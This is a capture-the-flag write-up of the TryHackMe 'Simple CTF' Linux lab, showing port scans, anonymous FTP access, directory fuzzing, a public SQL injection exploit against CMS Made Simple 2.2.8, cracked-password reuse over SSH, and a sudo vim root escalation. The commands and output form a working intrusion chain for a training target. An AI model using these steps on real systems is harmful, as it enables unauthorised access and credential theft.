---
layout: post
title: THM Simple CTF WriteUp
date: 2024-12-19
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - OSCP
  - Sudoers-Abusing
  - Vim-Binary
  - FTP-Anon-Allowed
  - Made-Simple-CMS
  - SQL-Injection
  - Password-Cracking
media_subpath: /assets/img/SimpleCTF
---
![Desktop View](SimpleCTF.png){: w="400"  h="400" }



# Simple CTF Skills


>**Simple CTF** is an easy Linux machine where we will use the following skills:

-  **Port Discovery**
-  **Web Fuzzing**
-  **Web Tech's Enumeration**
- **FTP Anonymous User Allowed**
- **Exploiting Made Simple CMS** 
-  **SQL Injection**
-  **Sudoers Abusing**
- **Abusing Vim Binary**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **21**, **80** & port **2222**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.197.75 -oG allPorts
Nmap scan report for 10.10.197.75
Host is up, received user-set (1.1s latency).
Scanned at 2024-12-19 14:32:14 CET for 85s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,80,2222 10.10.197.75 -oN targated
Nmap scan report for 10.10.197.75
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.116.52
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have to check the following ports & services:

- **Port 21 --> vsftpd 3.0.3**
- **Port 80 --> Apache httpd 2.4.18**
- **Port 2222 --> OpenSSH 7.2p2**

Let's start with the Apache service.

---
## Port 80 Enumeration

At first i run `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.197.75
http://10.10.197.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.197.75], Title[Apache2 Ubuntu Default Page: It works]
```

Nothing fancy, so i will take a look inside the website, once inside ***http://10.10.197.75***, we are in front of  a default Apache page:

![Desktop View](SimpleCTFMainPage.png)

Nothing in the source-code, so i will take a look to the FTP service.

## Port 21 Enumeration

The `nmap` scan showed that the FTP service allows anonymous user.

So let's see if we find something interesting.

```bash
❯ ftp 10.10.197.75
Connected to 10.10.197.75.
220 (vsFTPd 3.0.3)
Name (10.10.197.75:ne4rby): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43934|)
```

Once inside, after trying to list the files it doesn't show us anything but the next message: `229 Entering Extended Passive Mode (|||43934|)`, that can be easily fixed with the `passive` command.

```bash
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
```

So now, after listing files we see a directory named `pub`, if we seek inside we found a text file named `ForMitch.txt`, so let's download the file.

```bash
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |*********************************************************************************************************************************************|   166        3.29 MiB/s    00:00 ETA
226 Transfer complete.
166 bytes received in 00:03 (0.04 KiB/s)
ftp> 
```

This is the content of the file:

```bash
❯ cat ForMitch.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ForMitch.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can see that the system user has the same password as other user and also it's a weak password, let's save this info for later.

## Port 80 Exploitation

So, since we still have not found anything useful to gain access, let's try fuzzing the website.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.197.75 -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.197.75
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 313] [--> http://10.10.197.75/simple/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

I found a directory named **simple**, inside, we found a CMS named **Made Simple***:

![Desktop View](SimpleCTFMainPage2.png)

Checking the source code of the page we can find the version of the CMS.

```html
Copyright 2004 - 2024 - CMS Made Simple<br /> This site is powered by <a href='http://www.cmsmadesimple.org'>CMS Made Simple</a> version 2.2.8</p> 
```

So, let's see if there is any publicly available exploit for **CMS Made Simple v2.2.8**

```bash
❯ searchsploit made simple 2.2.8
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                | php/webapps/46635.py
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We found a **SQL Injection vulnerability**, so let's see what it does:

Taking a look to the script, it exploit a **time based SQL Injection** and dump **Users, Emails & Passwords** and then it crack them.

I've got some problems with the `python2` exploit, so i searched for the same exploit rewritten in `python3`, i found this one that worked prefectly:

- **Exploit**: [https://raw.githubusercontent.com/xtafnull/CMS-made-simple-sqli-python3/refs/heads/main/46635.py](https://raw.githubusercontent.com/xtafnull/CMS-made-simple-sqli-python3/refs/heads/main/46635.py)

After executing it and waiting it to end, we get the next result:

```bash
❯ python3 exploit.py -u "http://10.10.197.75/simple" -c -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

So, now that we have valid credentials: `mitch:secret`, we now need to know where to use them, so let's fuzz the `/simple` directory to find a login page.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.197.75/simple -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.197.75/simple
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 303]
/admin                (Status: 301) [Size: 319] [--> http://10.10.197.75/simple/admin/]
/assets               (Status: 301) [Size: 320] [--> http://10.10.197.75/simple/assets/]
/doc                  (Status: 301) [Size: 317] [--> http://10.10.197.75/simple/doc/]
/lib                  (Status: 301) [Size: 317] [--> http://10.10.197.75/simple/lib/]
/modules              (Status: 301) [Size: 321] [--> http://10.10.197.75/simple/modules/]
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.197.75/simple/tmp/]
/uploads              (Status: 301) [Size: 321] [--> http://10.10.197.75/simple/uploads/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

We found a `/admin` directory, so let's try to log in, after log in we are in front of a **admin dashboard**.

![Desktop View](SimpleCTFAdminPage.png)

I tried to upload a PHP reverse shell, but it didn't let me upload any PHP file, i tried also to bypass it but i failed.

So i remember the note in the FTP server, `"You set the same pass for the system user, and the password is so weak"` so maybe we can log in via SSH using the found credentials.

```bash
❯ ssh mitch@10.10.221.174 -p 2222
The authenticity of host '[10.10.221.174]:2222 ([10.10.221.174]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.221.174]:2222' (ED25519) to the list of known hosts.
mitch@10.10.221.174's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
```

And we are in, let's seek for a way to escalate priveleges.

## Shell as Mitch

Once inside we can open the user flag and submit it:

```bash
$ cat user.txt
G0** ***, ***p up!
```

After that i tried some usual PrivEsc ways, and i found that we can run the binary `vim` as root without password.

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

So after checking in [GTFOBins](https://gtfobins.github.io/) and i found that we can spawn a shell using `vim`, we can use the next command to spawn the shell:

```bash
sudo vim -c ':!/bin/sh'
:!/bin/sh
# whoami
root
```

We now have a root shell and we can open the root flag.

```bash
# cd /root
# ls
root.txt
# cat root.txt       
W3ll d***. *** **e it!
```

---

![Desktop View](SimpleCTFPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

